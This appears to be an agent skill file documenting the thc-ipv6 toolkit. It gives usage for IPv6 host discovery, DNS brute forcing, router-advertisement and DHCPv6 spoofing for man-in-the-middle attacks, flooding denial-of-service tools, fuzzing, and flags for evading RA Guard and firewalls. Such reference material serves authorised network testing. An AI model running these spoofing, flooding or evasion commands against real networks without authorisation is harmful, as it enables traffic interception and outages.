---
name: thc-ipv6
description: A comprehensive attack toolkit for testing IPv6 and ICMPv6 protocol weaknesses. Use for IPv6 reconnaissance, denial-of-service testing, man-in-the-middle attacks, firewall bypassing, and protocol fuzzing. It includes tools for DNS enumeration, router advertisement spoofing, and DHCPv6 manipulation.
---

# thc-ipv6

## Overview
The Hacker Choice's IPv6 Attack Toolkit is a collection of tools designed to exploit weaknesses in the IPv6 protocol suite. It covers information gathering, exploitation, and sniffing/spoofing within IPv6 environments. Category: Reconnaissance / Information Gathering / Exploitation.

## Installation (if not already installed)
Assume the toolkit is installed. If commands are missing:
```bash
sudo apt install thc-ipv6
```

## Common Workflows

### Local Network Discovery
Scan the local segment for alive IPv6 nodes:
```bash
atk6-alive6 eth0
```

### Passive Host Detection
Detect new IPv6 devices as they join the network:
```bash
atk6-detect-new-ip6 eth0
```

### IPv6 DNS Brute Forcing
Enumerate IPv6 (AAAA) records for a domain using the medium built-in dictionary:
```bash
atk6-dnsdict6 -m example.com
```

### Router Advertisement Spoofing
Announce yourself as a default router to intercept traffic:
```bash
atk6-fake_router6 eth0 2001:db8:1::/64
```

## Complete Command Reference

### Information Gathering & Discovery

| Tool | Command & Options |
|------|-------------------|
| **atk6-alive6** | `atk6-alive6 [-CFHLMPSdlpvV] [-I srcip6] [-i file] [-o file] [-e opt] [-s port,..] [-a port,..] [-u port,..] [-T tag] [-W TIME] interface [unicast-or-multicast-address [remote-router]]` |
| | `-i`: Input file; `-o`: Output file; `-v`: Verbose; `-d`: DNS resolve; `-M`: Enumerate MACs; `-C`: Enumerate common addresses; `-4`: Test IPv4 encodings; `-p`: Ping check; `-e`: Error packets (dst/hop); `-s`: TCP-SYN; `-a`: TCP-ACK; `-u`: UDP; `-F`: Firewall mode; `-n`: Send count; `-W`: Wait ms; `-S`: Slow mode; `-I`: Source IP; `-l`: Link-local; `-P`: Print only; `-m`: Raw mode. |
| **atk6-dnsdict6** | `atk6-dnsdict6 [-d4] [-s\|-m\|-l\|-x\|-u] [-t THREADS] [-D] domain [dictionary-file]` |
| | `-4`: Dump IPv4; `-t`: Threads (max 32); `-D`: Dump wordlist; `-d`: NS/MX info; `-e`: Ignore no NS errors; `-S`: SRV guessing; `-[smlxu]`: Dictionary size (small to uber). |
| **atk6-dnsrevenum6** | `atk6-dnsrevenum6 [-t] dns-server ipv6address` |
| | `-t`: Use TCP instead of UDP. |
| **atk6-dnssecwalk** | `atk6-dnssecwalk [-e46t] dns-server domain` |
| | `-e`: Ensure domain presence; `-4`: Resolve IPv4; `-6`: Resolve IPv6; `-t`: Use TCP. |
| **atk6-detect-new-ip6** | `atk6-detect-new-ip6 interface [script]` |
| **atk6-passive_discovery6** | `atk6-passive_discovery6 [-Ds] [-m maxhop] [-R prefix] interface [script]` |
| | `-D`: Dump destination; `-s`: Print addresses only; `-m`: Max hops; `-R`: Exchange prefix. |
| **atk6-node_query6** | `atk6-node_query6 interface target` |
| **atk6-trace6** | `atk6-trace6 [-abdtu] [-s src6] interface targetaddress [port]` |
| | `-a`: Router alert; `-D`: Dst header; `-E`: Invalid option; `-F`: Fragment; `-b`: TooBig; `-B`: PingReply; `-d`: DNS resolve; `-t`: Tunnel detect; `-u`: UDP. |

### Spoofing & MITM

| Tool | Command & Options |
|------|-------------------|
| **atk6-fake_router6** | `atk6-fake_router6 [-HFD] interface network/prefix [dns [router-ip [mtu [mac]]]]` |
| **atk6-fake_router26** | `atk6-fake_router26 [options] interface [target]` |
| | `-A`: Autoconfig net; `-R`: Route entry; `-D`: DNS; `-L`: Searchlist; `-M`: MTU; `-s`: Src IP; `-S`: Src MAC; `-p`: Priority; `-F`: Flags; `-E`: RA Guard Evasion (F, H, 1, D, O, o); `-i`: Interval; `-X`: Cleanup. |
| **atk6-parasite6** | `atk6-parasite6 [-lRFHD] interface [fake-mac]` |
| | `-l`: Loop; `-R`: Inject destination; `-F/-H/-D`: Security bypass. |
| **atk6-redir6** | `atk6-redir6 interface victim-ip target-ip original-router new-router [new-router-mac] [hop-limit]` |
| **atk6-fake_advertise6** | `atk6-fake_advertise6 [-DHF] [-Ors] [-n count] [-w sec] interface ip [target [mac [src-ip]]]` |
| **atk6-fake_dhcps6** | `atk6-fake_dhcps6 interface network/prefix dns-server [server-ip [mac]]` |
| **atk6-fake_dns6d** | `atk6-fake_dns6d interface ipv6-address [fake-ipv6 [fake-mac]]` |

### Denial of Service (DoS)

| Tool | Command & Options |
|------|-------------------|
| **atk6-denial6** | `atk6-denial6 interface destination test-case-number` |
| | Test cases 1-7: Large headers, unknown options, fragment pings, etc. |
| **atk6-dos-new-ip6** | `atk6-dos-new-ip6 [-S] interface` |
| | `-S`: Send conflicting NS query instead of NA reply. |
| **atk6-flood_router6** | `atk6-flood_router6 [-HFD] interface` |
| **atk6-flood_advertise6** | `atk6-flood_advertise6 [-k \| -m mac] interface [target]` |
| **atk6-ndpexhaust26** | `atk6-ndpexhaust26 [-acpPTUrRm] [-s sourceip6] interface target-network` |
| | `-a`: Router alert; `-c`: No checksum; `-p`: Echo Req; `-P`: Echo Reply; `-T`: TTL Exceeded; `-U`: Unreachable; `-r/-R`: Randomize source. |
| **atk6-smurf6** | `atk6-smurf6 [-i microseconds] interface victim-ip [multicast-net]` |

### Fuzzing & Implementation Testing

| Tool | Command & Options |
|------|-------------------|
| **atk6-fuzz_ip6** | `atk6-fuzz_ip6 [-x] [-t/T no] [-p no] [-IFSDHRJ] [-X\|-1..-0\|-P] interface target` |
| | `-1..-9`: ICMP6 types; `-0`: Node query; `-s`: TCP-SYN; `-P`: PIMv2; `-I`: Fuzz IP; `-F/S/D/H/R/J`: Fuzz extension headers. |
| **atk6-fuzz_dhcps6** | `atk6-fuzz_dhcps6 [-t/T/e no] [-p no] [-md] [-1..-8] interface [domain]` |
| **atk6-implementation6** | `atk6-implementation6 [-p] [-s sourceip6] interface destination [test-case]` |
| **atk6-firewall6** | `atk6-firewall6 [-Hu] interface destination port [test-case]` |

### Utilities

| Tool | Command & Options |
|------|-------------------|
| **atk6-address6** | `atk6-address6 <mac\|ipv4\|ipv6>` |
| **atk6-thcping6** | `atk6-thcping6 [options] interface src6 dst6 [srcmac [dstmac [data]]]` |
| | `-x`: Flood; `-H/D t:l:v`: Custom headers; `-f`: Fragment; `-S/U`: TCP/UDP mode. |
| **atk6-extract_hosts6** | `atk6-extract_hosts6 <file>` |
| **atk6-extract_networks6** | `atk6-extract_networks6 <interface>` |

## Notes
- **Debian Prefix**: All tools are prefixed with `atk6-` on Kali/Debian systems.
- **Safety**: Many tools (like `denial6`, `exploit6`, `rsmurf6`) can crash targets or saturate local networks. Use with extreme caution.
- **Evasion**: Flags like `-H` (Hop-by-Hop), `-F` (Fragmentation), and `-D` (Destination Header) are frequently used to bypass RA Guard or simple IPv6 firewalls.